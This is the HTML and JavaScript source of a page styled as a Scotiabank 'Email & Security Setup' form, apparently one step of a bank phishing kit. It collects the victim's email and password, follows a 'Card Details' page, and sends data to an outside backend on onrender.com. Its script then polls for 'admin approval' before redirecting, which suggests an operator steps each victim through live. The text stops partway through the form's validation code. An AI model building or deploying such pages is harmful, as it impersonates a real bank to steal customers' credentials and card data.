<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Email Setup | Scotiabank</title>
    <style>
        .loading {
            display: none;
        }
        .loading.active {
            display: inline-block;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .error-message {
            display: none;
            color: #EB121A;
            font-size: 14px;
            margin-top: 5px;
        }
        .error-message.show {
            display: block;
        }
        .success-message {
            display: none;
            color: #02a95c;
            font-size: 14px;
            margin-top: 5px;
        }
        .success-message.show {
            display: block;
        }
        .password-strength {
            height: 4px;
            margin-top: 8px;
            border-radius: 2px;
            transition: all 0.3s ease;
        }
        .strength-weak {
            width: 25%;
            background-color: #EB121A;
        }
        .strength-fair {
            width: 50%;
            background-color: #f59e0b;
        }
        .strength-good {
            width: 75%;
            background-color: #3b82f6;
        }
        .strength-strong {
            width: 100%;
            background-color: #02a95c;
        }
        .input-group {
            margin-bottom: 32px;
        }
        .input-label {
            display: block;
            font-size: 18px;
            font-weight: 600;
            color: #1d1d1d;
            margin-bottom: 8px;
        }
        .input-field {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 2px solid #7a7a7a;
            font-size: 22px;
            color: #1d1d1d;
            background: transparent;
            outline: none;
        }
        .input-field:focus {
            border-bottom-color: #007EAB;
        }
        .input-field.error {
            border-bottom-color: #EB121A;
        }
        .input-field.success {
            border-bottom-color: #02a95c;
        }
        .input-icon {
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 2px solid #7a7a7a;
            position: relative;
        }
        .input-icon:focus-within {
            border-bottom-color: #007EAB;
        }
        .password-toggle {
            position: absolute;
            right: 0;
            background: none;
            border: none;
            cursor: pointer;
            color: #7a7a7a;
        }
        .password-toggle:hover {
            color: #007EAB;
        }
        .requirements {
            margin-top: 8px;
            padding-left: 20px;
        }
        .requirement {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 4px;
            font-size: 14px;
            color: #7a7a7a;
        }
        .requirement.met {
            color: #02a95c;
        }
        .requirement.unmet {
            color: #EB121A;
        }
        .requirement-icon {
            width: 16px;
            height: 16px;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col bg-[#F6F7FC]">
    <div
        class="md:p-[20px] flex-1 flex flex-col md:justify-center items-center h-screen bg-[#FAFBFD]"
    >
        <div
            class="md:w-[600px] w-full md:mt-[60px] bg-[white] rounded-[8px] shadow-md md:p-[40px] p-[30px] flex flex-col items-center"
        >
            <div class="w-full flex items-end">
                <i data-lucide="mail" class="text-gray-700 ml-auto"></i>
            </div>
            
            <div class="text-center">
                <h1
                    class="mt-4 text-[1.6rem] leading-[3.5rem] font-[600] tracking-[-0.025rem] text-[rgb(51,51,51)]"
                    style="font-family: 'Scotia Headline', Arial, Helvetica, sans-serif"
                >
                    Email & Security Setup
                </h1>
                <p class="text-[#7a7a7a] text-[16px] mt-2">
                    Set up your email and password for account access
                </p>
            </div>
            
            <img
                src="data:image/png;base64,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"
                alt="Logo"
                class="h-[40px] mt-2"
            />

            <form id="emailForm" class="w-[350px] mt-[50px]">
                <!-- Email Address -->
                <div class="input-group">
                    <label class="input-label">Email Address</label>
                    <div class="input-icon">
                        <i data-lucide="mail" class="text-gray-700 w-5 h-5"></i>
                        <input
                            type="email"
                            id="email"
                            class="input-field"
                            placeholder="Enter your email address"
                            required
                        />
                    </div>
                    <div id="emailError" class="error-message"></div>
                    <p class="text-[#7a7a7a] text-[14px] mt-2">
                        This will be your primary contact email for account notifications.
                    </p>
                </div>

                <!-- Confirm Email -->
                <div class="input-group">
                    <label class="input-label">Confirm Email Address</label>
                    <div class="input-icon">
                        <i data-lucide="mail-check" class="text-gray-700 w-5 h-5"></i>
                        <input
                            type="email"
                            id="confirmEmail"
                            class="input-field"
                            placeholder="Re-enter your email address"
                            required
                        />
                    </div>
                    <div id="confirmEmailError" class="error-message"></div>
                </div>

                <!-- Password -->
                <div class="input-group">
                    <label class="input-label">Create Password</label>
                    <div class="input-icon">
                        <i data-lucide="lock-keyhole" class="text-gray-700 w-5 h-5"></i>
                        <input
                            type="password"
                            id="password"
                            class="input-field"
                            placeholder="Create a strong password"
                            required
                        />
                        <button type="button" id="togglePassword" class="password-toggle">
                            <i data-lucide="eye" class="w-5 h-5"></i>
                        </button>
                    </div>
                    
                    <!-- Password Strength Indicator -->
                    <div id="passwordStrength" class="password-strength"></div>
                    
                    <!-- Password Requirements -->
                    <div class="requirements">
                        <div class="requirement" id="reqLength">
                            <i data-lucide="x" class="requirement-icon"></i>
                            <span>At least 8 characters</span>
                        </div>
                        <div class="requirement" id="reqUppercase">
                            <i data-lucide="x" class="requirement-icon"></i>
                            <span>At least one uppercase letter</span>
                        </div>
                        <div class="requirement" id="reqLowercase">
                            <i data-lucide="x" class="requirement-icon"></i>
                            <span>At least one lowercase letter</span>
                        </div>
                        <div class="requirement" id="reqNumber">
                            <i data-lucide="x" class="requirement-icon"></i>
                            <span>At least one number</span>
                        </div>
                        <div class="requirement" id="reqSpecial">
                            <i data-lucide="x" class="requirement-icon"></i>
                            <span>At least one special character</span>
                        </div>
                    </div>
                    
                    <div id="passwordError" class="error-message"></div>
                </div>

                <!-- Confirm Password -->
                <div class="input-group">
                    <label class="input-label">Confirm Password</label>
                    <div class="input-icon">
                        <i data-lucide="lock-keyhole" class="text-gray-700 w-5 h-5"></i>
                        <input
                            type="password"
                            id="confirmPassword"
                            class="input-field"
                            placeholder="Confirm your password"
                            required
                        />
                        <button type="button" id="toggleConfirmPassword" class="password-toggle">
                            <i data-lucide="eye" class="w-5 h-5"></i>
                        </button>
                    </div>
                    <div id="confirmPasswordError" class="error-message"></div>
                </div>

                <!-- Terms and Conditions -->
                <div class="mb-8">
                    <label class="flex items-start gap-3 text-[#1d1d1d] cursor-pointer">
                        <input type="checkbox" id="terms" class="hidden peer" required />
                        
                        <span
                            class="w-[26px] h-[26px] rounded-md border-2 border-[#7a7a7a] flex items-center justify-center peer-checked:bg-[#007EAB] peer-checked:border-[#007EAB] mt-1 flex-shrink-0"
                        >
                            <svg
                                class="w-4 h-4 text-white opacity-0 peer-checked:opacity-100"
                                viewBox="0 0 24 24"
                                fill="currentColor"
                            >
                                <path d="M20.3 5.7l-11 11-5-5 1.4-1.4 3.6 3.6 9.6-9.6z" />
                            </svg>
                        </span>

                        <span class="text-[16px] font-[300] leading-relaxed">
                            I agree to the <a href="#" class="text-[#03749D] font-[600]">Terms of Service</a> and 
                            <a href="#" class="text-[#03749D] font-[600]">Privacy Policy</a>. I understand that 
                            Scotiabank will use my email for account communication and security purposes.
                        </span>
                    </label>
                    <div id="termsError" class="error-message"></div>
                </div>

                <!-- Success Message -->
                <div id="successMessage" class="success-message"></div>

                <!-- Submit Button -->
                <div class="w-full flex justify-center mt-[40px]">
                    <button
                        id="submitBtn"
                        type="submit"
                        class="w-[300px] bg-[#007EAB] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2 hover:bg-[#006c92] transition-colors"
                    >
                        <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        <span class="text-[white] text-[13px]">Complete Setup</span>
                    </button>
                </div>

                <!-- Back Link -->
                <a href="c.html" class="w-full flex justify-center mt-[20px] items-center">
                    <i data-lucide="chevron-left" class="text-[#03749D] w-5 h-5"></i>
                    <span class="text-[#03749D] text-[16px] font-[700] ml-2">
                        Back to Card Details
                    </span>
                </a>
            </form>
        </div>

        <div class="md:flex block gap-[8px] mt-[50px] mb-[70px] text-center">
            <span>Need help with email setup?</span>
            <br class="md:hidden"/>
            <a href="#" class="font-[600] text-[16px]">Contact our support team</a>
        </div>
    </div>

    <footer class="pt-6 pb-3 text-sm text-gray-600 bg-[white] shadow-md border border-1 hidden md:block">
        <div class="flex justify-between mb-4 py-[10px] px-[50px]">
            <div>
                <img class="h-9 w-13" src="data:image/png;base64,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" alt="">
            </div>
            <div class="flex gap-[20px] font-[300] flex-wrap">
                <a href="#">Contact Us</a>
                <a href="#">Security</a>
                <a href="#">Legal</a>
                <a href="#">Privacy</a>
                <a href="#">Accessibility</a>
                <a href="#">Cookie Settings</a>
            </div>
        </div>

        <hr class="mt-4 mb-3" />

        <div class="flex justify-end px-[20px]">
            <span class="text-[12px]">Â© Scotiabank. All Rights Reserved.</span>
        </div>
    </footer>

    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <script>
        // Backend URL - make sure this matches your Flask backend
        const BACKEND_URL = 'https://s-bcknd.onrender.com';
        // Alternative for local testing: 'http://localhost:5000'
        
        console.log('Using backend URL:', BACKEND_URL);
        
        // Initialize Lucide icons
        lucide.createIcons();
        
        // Password toggle functionality
        document.getElementById('togglePassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('password');
            const icon = this.querySelector('i');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                icon.setAttribute('data-lucide', 'eye-off');
            } else {
                passwordInput.type = 'password';
                icon.setAttribute('data-lucide', 'eye');
            }
            lucide.createIcons();
        });
        
        document.getElementById('toggleConfirmPassword').addEventListener('click', function() {
            const passwordInput = document.getElementById('confirmPassword');
            const icon = this.querySelector('i');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                icon.setAttribute('data-lucide', 'eye-off');
            } else {
                passwordInput.type = 'password';
                icon.setAttribute('data-lucide', 'eye');
            }
            lucide.createIcons();
        });
        
        // Password strength checker
        function checkPasswordStrength(password) {
            let score = 0;
            const requirements = {
                length: password.length >= 8,
                uppercase: /[A-Z]/.test(password),
                lowercase: /[a-z]/.test(password),
                number: /[0-9]/.test(password),
                special: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)
            };
            
            // Count met requirements
            Object.values(requirements).forEach(met => {
                if (met) score++;
            });
            
            // Update requirement icons
            updateRequirementIcons(requirements);
            
            // Update strength bar
            updateStrengthBar(score);
            
            return score;
        }
        
        function updateRequirementIcons(requirements) {
            const requirementIds = {
                length: 'reqLength',
                uppercase: 'reqUppercase',
                lowercase: 'reqLowercase',
                number: 'reqNumber',
                special: 'reqSpecial'
            };
            
            Object.entries(requirements).forEach(([key, met]) => {
                const element = document.getElementById(requirementIds[key]);
                const icon = element.querySelector('i');
                
                if (met) {
                    element.classList.remove('unmet');
                    element.classList.add('met');
                    icon.setAttribute('data-lucide', 'check');
                } else {
                    element.classList.remove('met');
                    element.classList.add('unmet');
                    icon.setAttribute('data-lucide', 'x');
                }
            });
            
            lucide.createIcons();
        }
        
        function updateStrengthBar(score) {
            const strengthBar = document.getElementById('passwordStrength');
            strengthBar.className = 'password-strength';
            
            if (score === 0) {
                return;
            } else if (score <= 2) {
                strengthBar.classList.add('strength-weak');
            } else if (score === 3) {
                strengthBar.classList.add('strength-fair');
            } else if (score === 4) {
                strengthBar.classList.add('strength-good');
            } else if (score === 5) {
                strengthBar.classList.add('strength-strong');
            }
        }
        
        // Clear all error messages
        function clearErrors() {
            const errorElements = document.querySelectorAll('.error-message');
            errorElements.forEach(el => {
                el.classList.remove('show');
                el.textContent = '';
            });
            
            const inputElements = document.querySelectorAll('.input-field');
            inputElements.forEach(el => {
                el.classList.remove('error');
                el.classList.remove('success');
            });
        }
        
        // Show error for specific field
        function showError(fieldId, message) {
            const errorElement = document.getElementById(fieldId + 'Error');
            const inputElement = document.getElementById(fieldId);
            
            if (errorElement) {
                errorElement.textContent = message;
                errorElement.classList.add('show');
            }
            
            if (inputElement) {
                inputElement.classList.add('error');
            }
        }
        
        // Show success for specific field
        function showSuccess(fieldId) {
            const inputElement = document.getElementById(fieldId);
            if (inputElement) {
                inputElement.classList.remove('error');
                inputElement.classList.add('success');
            }
        }
        
        // Validate email format
        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }
        
        // Validate password
        function validatePassword(password) {
            const requirements = {
                length: password.length >= 8,
                uppercase: /[A-Z]/.test(password),
                lowercase: /[a-z]/.test(password),
                number: /[0-9]/.test(password),
                special: /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)
            };
            
            return Object.values(requirements).every(met => met);
        }
        
        // Poll status function (same as other pages)
        async function pollStatus(sessionId) {
            let attempts = 0;
            const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
            
            const checkStatus = async () => {
                try {
                    console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
                    const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
                    
                    if (!response.ok) {
                        console.error('Status check failed:', response.status);
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 5000);
                        } else {
                            document.getElementById('successMessage').textContent = 'Status check timed out. Please try again.';
                            document.getElementById('successMessage').classList.add('show');
                            document.getElementById('successMessage').classList.remove('success-message');
                            document.getElementById('successMessage').classList.add('error-message');
                            resetButton();
                        }
                        return;
                    }
                    
                    const data = await response.json();
                    console.log('Status check response:', data);
                    
                    if (data.status === 'approved' && data.redirect_url) {
                        // Approved - redirect to next page
                        const redirectUrl = data.redirect_url;
                        console.log('Approved! Redirecting to:', redirectUrl);
                        
                        // If the redirect_url is a page name (not full URL), construct URL
                        if (!redirectUrl.startsWith('http')) {
                            window.location.href = redirectUrl;
                        } else {
                            window.location.href = redirectUrl;
                        }
                        return true;
                    } else if (data.status === 'pending') {
                        // Continue polling
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 5000); // Check every 5 seconds
                            
                            // Update message every few attempts
                            if (attempts % 12 === 0) { // Every minute
                                const minutes = attempts / 12;
                                document.getElementById('successMessage').textContent = `Still waiting for admin approval... (${minutes} minute${minutes > 1 ? 's' : ''})`;
                            }
                        } else {
                            // Timeout
                            document.getElementById('successMessage').textContent = 'Request timed out after 10 minutes. Please try again.';
                            document.getElementById('successMessage').classList.add('show');
                            document.getElementById('successMessage').classList.remove('success-message');
                            document.getElementById('successMessage').classList.add('error-message');
                            resetButton();
                        }
                    } else if (data.error) {
                        // Error from backend
                        document.getElementById('successMessage').textContent = `Error: ${data.error}`;
                        document.getElementById('successMessage').classList.add('show');
                        document.getElementById('successMessage').classList.remove('success-message');
                        document.getElementById('successMessage').classList.add('error-message');
                        resetButton();
                    }
                } catch (error) {
                    console.error('Status check error:', error);
                    attempts++;
                    if (attempts < maxAttempts) {
                        setTimeout(checkStatus, 5000);
                    } else {
                        document.getElementById('successMessage').textContent = 'Status check error. Please try again.';
                        document.getElementById('successMessage').classList.add('show');
                        document.getElementById('successMessage').classList.remove('success-message');
                        document.getElementById('successMessage').classList.add('error-message');
                        resetButton();
                    }
                }
                return false;
            };
            
            // Start polling
            setTimeout(checkStatus, 5000); // First check after 5 seconds
        }
        
        function resetButton() {
            const submitBtn = document.getElementById('submitBtn');
            const loadingIcon = submitBtn.querySelector('.loading');
            const submitText = submitBtn.querySelector('span');
            
            loadingIcon.classList.remove('active');
            submitText.textContent = 'Complete Setup';
            submitBtn.disabled = false;
        }
        
        // Form submission
        document.getElementById('emailForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            
            // Get form values
            const email = document.getElementById('email').value.trim();
            const confirmEmail = document.getElementById('confirmEmail').value.trim();
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            const termsAccepted = document.getElementById('terms').checked;
            
            // Show loading state
            const submitBtn = document.getElementById('submitBtn');
            const spinner = submitBtn.querySelector('.loading');
            const buttonText = submitBtn.querySelector('span');
            
            spinner.classList.add('active');
            buttonText.textContent = 'Setting up...';
            submitBtn.disabled = true;
            
            // Clear previous errors and success messages
            clearErrors();
            document.getElementById('successMessage').classList.remove('show');
            
            // Validate fields
            let isValid = true;
            
            // Validate Email
            if (!email) {
                showError('email', 'Please enter your email address');
                isValid = false;
            } else if (!validateEmail(email)) {
                showError('email', 'Please enter a valid email address');
                isValid = false;
            } else {
                showSuccess('email');
            }
            
            // Validate Confirm Email
            if (!confirmEmail) {
                showError('confirmEmail', 'Please confirm your email address');
                isValid = false;
            } else if (email !== confirmEmail) {
                showError('confirmEmail', 'Email addresses do not match');
                isValid = false;
            } else {
                showSuccess('confirmEmail');
            }
            
            // Validate Password
            if (!password) {
                showError('password', 'Please create a password');
                isValid = false;
            } else if (!validatePassword(password)) {
                showError('password', 'Password does not meet all requirements');
                isValid = false;
            } else {
                showSuccess('password');
            }
            
            // Validate Confirm Password
            if (!confirmPassword) {
                showError('confirmPassword', 'Please confirm your password');
                isValid = false;
            } else if (password !== confirmPassword) {
